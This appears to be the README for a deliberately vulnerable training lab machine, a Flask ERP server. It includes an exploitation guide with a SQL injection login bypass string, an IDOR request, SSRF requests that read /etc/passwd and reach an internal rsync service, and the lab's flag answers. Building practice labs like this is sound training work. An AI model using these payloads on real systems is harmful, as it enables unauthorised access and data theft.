# 🏢 VulnCorp — Machine 8: int-erp01 (ERP Application Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 8 is an enterprise resource planning server in the **Internal Zone (`192.168.1.20`)** running a custom Flask ERP connected to PostgreSQL, featuring **SQL Injection**, **Insecure Direct Object References (IDOR)**, **Server-Side Request Forgery (SSRF)**, and **Business Logic flaws**.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on **Ubuntu 24.04 LTS** instance `interp01` (`192.168.1.20`).

Spec services: Flask 3.0.x (Python 3.12.3), PostgreSQL 16.2, Microsoft SQL Server 2017 or 2019 (simulated).

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/int-erp01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **ERP Portal** | `80` | Flask Web Application | SQLi Login Bypass, IDOR on `/erp/records`, SSRF on `/erp/import` |
| **PostgreSQL** | `5432` | ERP Database | Default service credentials |
| **SSH** | `22` | OpenSSH | Standard access |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. SQL Injection Login Bypass
Navigate to `http://192.168.1.20/erp/login` and input:
- **Username:** `admin' OR '1'='1' --`
- **Password:** `anything`

### 2. IDOR on Employee Records
```bash
# Extract records of admin (id=1), John Doe (id=2), Jane Smith (id=3)
curl "http://192.168.1.20/erp/records?id=1"
```

### 3. Server-Side Request Forgery (SSRF)
Use the document import function to pivot into other internal services:
```bash
# SSRF to Backup Server rsync port
curl "http://192.168.1.20/erp/import?url=http://192.168.1.50:873/"

# SSRF to local system files
curl "http://192.168.1.20/erp/import?url=file:///etc/passwd"
```

---

## 🏆 Flags

- **IDOR Flag:** `VULN{1d0r_3rp_r3c0rds}`
- **SSRF Flag:** `VULN{ssrf_1nt3rn4l_s4n}`
- **SQLi Flag:** `VULN{sql1_erp_byp4ss}`
- **Root Flag:** `/root/root.txt` (`VULN{erp_syst3m_pwn3d_m4ch1n3_8}`)
